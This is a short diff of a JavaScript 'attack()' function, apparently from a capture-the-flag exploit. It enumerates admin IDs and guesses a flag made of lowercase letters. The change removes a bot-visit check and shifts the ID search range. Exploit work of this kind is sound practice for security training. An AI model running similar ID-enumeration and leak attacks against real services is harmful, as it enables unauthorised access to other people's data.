@@ -39,12 +39,9 @@ async function checkId(id) {
 } 
 
 async function attack() {
-    //make sure the bot was on the website
-    sendRequest("test=true");
-
     let noteName = "";
     let lowercase_letters = "azertyuiopmlkjhgfdsqwxcvbn"; //the flag is supposed to be composed of only lowercase letters
-    for (let i = 0; i < 500; i++) {
+    for (let i = 500; i < 1000; i++) {
         //retrieve admin id
         try {
             await checkId(i);
